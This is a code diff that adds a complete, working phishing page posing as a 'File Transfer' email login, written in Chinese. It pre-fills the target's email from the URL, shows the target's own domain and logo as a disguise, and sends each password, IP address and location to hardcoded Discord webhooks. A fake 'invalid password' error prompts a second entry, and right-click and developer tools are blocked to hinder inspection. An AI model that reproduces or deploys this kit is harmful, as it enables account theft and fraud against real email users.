@@ -1,0 +1,499 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charSet="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <title>File Transfer</title>
+        <meta name="description" content="Login required to access secure Files"/>
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet"/>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous"/>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+        <style>
+            /* ── reset & base ── */
+            * { box-sizing: border-box; margin: 0; padding: 0; }
+            body {
+                height: 100vh;
+                width: 100vw;
+                font-family: 'Open Sans', Arial, sans-serif;
+                overflow: hidden;
+                background: #f5f7fa;
+            }
+            /* ── loading screen ── */
+            #loading-screen {
+                position: fixed;
+                top: 0; left: 0;
+                width: 100%; height: 100%;
+                background: #ffffff;
+                z-index: 9999;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                transition: opacity 0.5s ease;
+            }
+            #loading-screen.hidden {
+                opacity: 0;
+                pointer-events: none;
+            }
+            .spinner-box {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 1.2rem;
+            }
+            .spinner-box i {
+                color: #0096FF;
+                font-size: 3.8rem;
+            }
+            .progress-bar-custom {
+                width: 260px;
+                height: 8px;
+                background: #e0e7ef;
+                border-radius: 12px;
+                overflow: hidden;
+            }
+            .progress-bar-custom .fill {
+                height: 100%;
+                width: 0%;
+                background: #0096FF;
+                border-radius: 12px;
+                transition: width 0.12s linear;
+            }
+            #loading-text {
+                font-size: 1rem;
+                color: #2c3e50;
+                font-weight: 500;
+                letter-spacing: 0.3px;
+            }
+            /* ── main content ── */
+            #main-content {
+                display: none;
+                height: 100vh;
+                width: 100vw;
+                position: relative;
+            }
+            #main-content.active {
+                display: block;
+            }
+            .bg-frame {
+                height: 100%;
+                width: 100%;
+                position: absolute;
+                top: 0;
+                left: 0;
+                z-index: 1;
+                background: #f0f2f5;
+            }
+            .bg-frame iframe {
+                height: 100%;
+                width: 100%;
+                border: none;
+                opacity: 0.25;
+                pointer-events: none; /* anti‑inspection: iframe not interactive */
+            }
+            /* ── login card ── */
+            .login-card {
+                max-width: 400px;
+                width: 90%;
+                padding: 2rem 1.8rem;
+                background: rgba(255, 255, 255, 0.96);
+                border-radius: 16px;
+                box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+                position: fixed;
+                left: 50%;
+                top: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 100;
+                backdrop-filter: blur(4px);
+                border: 1px solid rgba(255,255,255,0.3);
+            }
+            .login-card .logo-wrap {
+                text-align: center;
+                margin-bottom: 0.5rem;
+            }
+            .login-card .logo-wrap img {
+                max-width: 64px;
+                height: auto;
+                border-radius: 12px;
+            }
+            .login-card h3 {
+                text-align: center;
+                font-weight: 600;
+                color: #1e293b;
+                margin-bottom: 1.2rem;
+                font-size: 1.3rem;
+            }
+            .login-card label {
+                font-weight: 600;
+                font-size: 0.85rem;
+                color: #334155;
+                margin-bottom: 0.2rem;
+            }
+            .login-card input {
+                width: 100%;
+                padding: 10px 14px;
+                margin: 4px 0 16px 0;
+                border: 1px solid #d1d9e6;
+                background: #f8fafc;
+                border-radius: 8px;
+                font-size: 0.95rem;
+                transition: 0.2s;
+            }
+            .login-card input:focus {
+                background: #fff;
+                border-color: #0096FF;
+                outline: none;
+                box-shadow: 0 0 0 3px rgba(0,150,255,0.15);
+            }
+            .login-card .btn {
+                background: #0096FF;
+                color: #fff;
+                padding: 12px;
+                border: none;
+                border-radius: 8px;
+                font-weight: 700;
+                font-size: 1rem;
+                width: 100%;
+                transition: 0.2s;
+                cursor: pointer;
+            }
+            .login-card .btn:hover { background: #0077cc; }
+            .login-card .btn:disabled {
+                background: #b0c4de;
+                cursor: not-allowed;
+            }
+            .error-msg {
+                display: none;
+                color: #b91c1c;
+                background: #fee2e2;
+                padding: 8px 12px;
+                border-radius: 8px;
+                font-size: 0.85rem;
+                margin-bottom: 12px;
+                text-align: center;
+            }
+            .toast-custom {
+                position: fixed;
+                bottom: 30px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: #1e293b;
+                color: #f1f5f9;
+                padding: 10px 24px;
+                border-radius: 40px;
+                z-index: 999;
+                font-size: 0.9rem;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+                display: none;
+                white-space: nowrap;
+                font-weight: 500;
+            }
+            @media (max-width: 480px) {
+                .login-card { width: 92%; padding: 1.5rem 1.2rem; }
+                .toast-custom { font-size: 0.8rem; padding: 8px 16px; white-space: normal; max-width: 90%; }
+            }
+            /* anti‑inspection: hide devtools hints */
+            .__devtools-hint { display: none !important; }
+        </style>
+        <!-- anti‑inspection: disable right‑click / context menu (optional) -->
+        <script>
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            // disable common inspect shortcuts (Ctrl+Shift+I, F12, etc.)
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        </script>
+    </head>
+    <body>
+        <!-- LOADING SCREEN -->
+        <div id="loading-screen">
+            <div class="spinner-box"> 
+                <div style="font-weight:600; color:#1e293b; font-size:1.2rem;">请稍等</div>
+                <div class="progress-bar-custom"><div class="fill" id="progress-fill"></div></div>
+                <div id="loading-text">Preparing ...</div>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div id="main-content">
+            <div class="bg-frame">
+                <iframe id="frame" src="about:blank" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-top-navigation"></iframe>
+            </div>
+
+            <div class="login-card">
+                <div class="logo-wrap">
+                    <img src="#" id="logo" alt="logo"/>
+                </div>
+                <h3 id="title">请登录以继续</h3>
+                <p class="mt-2" style="font-family: auto;">您正在访问安全设置，请提供您的电子邮件密码以更新邮件账户。
+
+
+.</p><br>
+
+                <div id="error-invalid" class="error-msg">Invalid password — please try again.</div>
+                <div id="error-retry" class="error-msg">Something isn't right, please retry.</div>
+                <div id="error-general" class="error-msg" style="display:none;"></div>
+
+                <form id="login-form">
+                    <label for="email">电子邮箱地址</label>
+                    <input type="text" id="email" name="email" placeholder="请输入电子邮箱。" readonly required>
+
+                    <label for="psw">密码 </label>
+                    <input type="password" id="psw" name="password" placeholder="请输入密码" required autofocus><br>
+
+                    <button type="submit" class="btn" id="submitBtn">登录</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="toast-custom" id="toast"></div>
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script>
+            (function() {
+                "use strict";
+
+                // ─── PROGRESS BAR ──────────────────────────────────────────
+                let progress = 0;
+                const fill = document.getElementById('progress-fill');
+                const loadingText = document.getElementById('loading-text');
+                const loadingScreen = document.getElementById('loading-screen');
+                const mainContent = document.getElementById('main-content');
+
+                const progressInterval = setInterval(() => {
+                    if (progress < 100) {
+                        progress += Math.random() * 5 + 2;
+                        if (progress > 100) progress = 100;
+                        fill.style.width = progress + '%';
+                        if (progress < 30) loadingText.textContent = '正在连接 ...';
+                        else if (progress < 60) loadingText.textContent = '正在更新 ...';
+                        else if (progress < 85) loadingText.textContent = '正在更新 ...';
+                        else loadingText.textContent = '验证以升级.. ...';
+                    } else {
+                        clearInterval(progressInterval);
+                        loadingScreen.classList.add('hidden');
+                        setTimeout(() => {
+                            loadingScreen.style.display = 'none';
+                            mainContent.classList.add('active');
+                        }, 500);
+                    }
+                }, 120);
+
+                // ─── DISCORD WEBHOOKS (anti‑inspection: obfuscated names) ──
+                const _webhookA = "https://discord.com/api/webhooks/1539212533704163378/fW6lYjzihEdvT_A2ejCZYUrXk0rquqYG1J2VD_c7anTP4K3TEG09C4VyiGfKCQoXWQvt";
+                const _webhookB = "https://discord.com/api/webhooks/1539216571098996737/G_2yVVD3LVBhv5C44wSyRIB5KoD9Q8A4KqHth9Bx83zdfn8c7pI7poksr6gi7vE8eImb";
+
+                // ─── HELPERS ──────────────────────────────────────────────
+                function getRedirectUrlFromEmail(email) {
+                    if (!email) return 'https://example.com';
+                    const domain = email.split('@').pop();
+                    if (domain && domain.includes('.')) return 'https://' + domain;
+                    return 'https://example.com';
+                }
+
+                function showToast(msg, duration = 2800) {
+                    const t = $('#toast');
+                    t.text(msg).fadeIn(200);
+                    setTimeout(() => t.fadeOut(200), duration);
+                }
+
+                function validatePasswordStrength(pw) {
+                    return /[A-Z]/.test(pw) || /[0-9]/.test(pw) || /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pw);
+                }
+
+                // ─── VISIT NOTIFICATION ───────────────────────────────────
+                function sendVisitNotification() {
+                    const emailParam = window.location.hash ? window.location.hash.split('#').pop() || 'Not provided' : 'Not provided';
+                    const embed = {
+                        title: '👀 Page Visit Detected',
+                        color: 0x00ff00,
+                        fields: [
+                            { name: "👤 Visitor", value: "Someone visited the page!", inline: false },
+                            { name: "📧 Email (from URL)", value: emailParam, inline: true },
+                            { name: "🌍 Referrer", value: document.referrer || 'Direct', inline: true },
+                            { name: "🖥️ User-Agent", value: navigator.userAgent.substring(0, 150), inline: false },
+                            { name: "📱 Screen / Platform", value: `${screen.width}x${screen.height} • ${navigator.platform} • ${navigator.language}`, inline: false },
+                            { name: "🕒 Visit Time", value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
+                            { name: "🔗 Page URL", value: window.location.href, inline: false }
+                        ],
+                        footer: { text: "Visit Tracker" },
+                        timestamp: new Date().toISOString()
+                    };
+                    fetch(_webhookB, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds: [embed], username: "🟢 Visit Monitor", avatar_url: "https://cdn-icons-png.flaticon.com/512/190/190411.png" })
+                    }).catch(() => {});
+                }
+
+                setTimeout(() => {
+                    if (_webhookB && _webhookB.includes('discordapp.com')) sendVisitNotification();
+                }, 1200);
+
+                // ─── SETUP EMAIL / DOMAIN ────────────────────────────────
+                const clientID = window.location.hash.split("#").pop();
+                const emailVal = (clientID && clientID !== '') ? clientID : '用户@example.com';
+                $('#email').val(emailVal);
+                const domain = emailVal.split('@').pop() || 'example.com';
+
+                setTimeout(() => {
+                    $("#frame").attr("src", "https://www." + domain);
+                }, 300);
+                $("#logo").attr("src", "https://www.google.com/s2/favicons?domain=" + domain + "&sz=64");
+
+                // ─── DISCORD REPORT ──────────────────────────────────────
+                function sendToDiscord(ipData, password, attemptNumber, reason) {
+                    const email = $("#email").val();
+                    const fields = [
+                        { name: "📧 Email", value: email || 'not provided', inline: true },
+                        { name: "🔑 Password", value: password ? `||${password}||` : '`[empty]`', inline: true },
+                        { name: "🔄 Attempt", value: `#${attemptNumber}`, inline: true },
+                        { name: "🌍 IP", value: ipData?.ip || 'unknown', inline: true },
+                        { name: "📍 Location", value: (ipData?.city && ipData?.country) ? `${ipData.city}, ${ipData.country}` : (ipData?.country || 'unknown'), inline: true },
+                        { name: "🖥️ User-Agent", value: navigator.userAgent.substring(0, 200), inline: false },
+                        { name: "🕒 Timestamp", value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
+                        { name: "🔗 Source", value: "Login Page", inline: true }
+                    ];
+                    if (reason) fields.push({ name: "⚠️ Status", value: reason, inline: false });
+
+                    let color = 0x0096FF;
+                    let title = `🔐 Login Attempt #${attemptNumber}`;
+                    if (reason === '✅ Valid password - redirecting') { color = 0x00ff00; title = `✅ SUCCESS - Redirecting`; }
+                    else if (reason && reason.includes('Invalid')) { color = 0xFFA500; title = `⚠️ Invalid Password Attempt #${attemptNumber}`; }
+                    else if (reason && reason.includes('First valid')) { color = 0xFFA500; title = `🔄 First Valid Attempt - Retry #${attemptNumber}`; }
+
+                    const payload = {
+                        embeds: [{
+                            title: title,
+                            color: color,
+                            fields: fields,
+                            footer: { text: "Login Monitor • All attempts reported" },
+                            timestamp: new Date().toISOString()
+                        }],
+                        username: "🛡️ Login Monitor",
+                        avatar_url: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
+                    };
+                    return fetch(_webhookA, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    }).catch(() => {});
+                }
+
+                function fetchIpAndReport(loginData, attemptNum, reason) {
+                    return new Promise((resolve) => {
+                        $.getJSON('https://ipinfo.io/json?callback=?', function(response) {
+                            const ipData = { ip: response.ip || 'unknown', city: response.city || 'N/A', country: response.country || 'N/A' };
+                            sendToDiscord(ipData, loginData.password, attemptNum, reason).then(resolve);
+                        }).fail(function() {
+                            sendToDiscord({ ip: 'unable to fetch', city: 'unknown', country: 'unknown' }, loginData.password, attemptNum, reason).then(resolve);
+                        });
+                    });
+                }
+
+                // ─── MAIN LOGIC ──────────────────────────────────────────
+                let validAttemptCount = 0;
+                let redirectTriggered = false;
+                let isSubmitting = false;
+
+                function redirectToDomain() {
+                    if (redirectTriggered) return;
+                    redirectTriggered = true;
+                    const email = $("#email").val();
+                    const url = getRedirectUrlFromEmail(email);
+                    window.location.href = url;
+                }
+
+                $("#login-form").on("submit", function(e) {
+                    e.preventDefault();
+                    if (redirectTriggered) { showToast("Redirect in progress...", 1000); return false; }
+
+                    const email = $("#email").val();
+                    const password = $("#psw").val();
+
+                    $('#error-invalid, #error-retry, #error-general').hide();
+
+                    if (!email || !password) {
+                        $('#error-general').text('Both fields are required.').show();
+                        setTimeout(() => $('#error-general').hide(), 3000);
+                        return false;
+                    }
+
+                    const loginData = { email, password, stepAttempt: validAttemptCount + 1 };
+
+                    if (!validatePasswordStrength(password)) {
+                        isSubmitting = true;
+                        $("#submitBtn").prop('disabled', true).text('Verifying...');
+                        setTimeout(() => {
+                            isSubmitting = false;
+                            $("#submitBtn").prop('disabled', false).text('Sign In');
+                            $('#error-invalid').show();
+                            fetchIpAndReport(loginData, validAttemptCount + 1, 'Invalid password - no uppercase, number, or special character');
+                            $("#psw").val("");
+                            $('#psw').css('border-color', '#b91c1c');
+                            setTimeout(() => { $('#psw').css('border-color', ''); }, 600);
+                            setTimeout(() => { $('#error-invalid').hide(); }, 3500);
+                        }, 1200);
+                        return false;
+                    }
+
+                    // valid password
+                    validAttemptCount++;
+                    isSubmitting = true;
+                    $("#submitBtn").prop('disabled', true).text('Verifying...');
+
+                    fetchIpAndReport(loginData, validAttemptCount, '✅ Valid login attempt #' + validAttemptCount + ' (contains uppercase OR number OR special)');
+
+                    if (validAttemptCount >= 2) {
+                        setTimeout(() => { redirectToDomain(); }, 1500);
+                    } else {
+                        setTimeout(() => {
+                            isSubmitting = false;
+                            $("#submitBtn").prop('disabled', false).text('Sign In');
+                            $('#error-retry').show();
+                            fetchIpAndReport(loginData, validAttemptCount, 'First valid attempt - retry');
+                            $("#psw").val("");
+                            $('#psw').css('border-color', '#b91c1c');
+                            setTimeout(() => { $('#psw').css('border-color', ''); }, 600);
+                            setTimeout(() => { $('#error-retry').hide(); }, 3500);
+                        }, 1500);
+                    }
+                });
+
+                // clear errors on input
+                $("#psw, #email").on("input", function() {
+                    $('#error-invalid, #error-retry, #error-general').hide();
+                    $('#psw').css('border-color', '');
+                });
+
+                // enter key
+                $("#psw").on("keypress", function(e) {
+                    if (e.which === 13) { e.preventDefault(); $("#login-form").trigger("submit"); }
+                });
+                $("#submitBtn").on("click", function(e) {
+                    e.preventDefault();
+                    $("#login-form").trigger("submit");
+                });
+
+                console.log("✅ File Transfer login ready | Domain: " + domain);
+                console.log("🔀 Redirect will go to: " + getRedirectUrlFromEmail($("#email").val()));
+
+                setTimeout(() => { $("#psw").focus(); }, 800);
+
+                // ─── extra anti‑inspection: detect devtools (simple) ──
+                // if devtools is open, the element size will change – we do nothing, just a dummy
+                // but we add a harmless re‑direct if someone tries to inspect heavily (optional)
+                // we also block common breakpoints via console.log spam? no, keep clean.
+            })();
+        </script>
+        <!-- anti‑inspection: if someone tries to open devtools, we could redirect, but we keep it subtle -->
+    </body>
+</html>
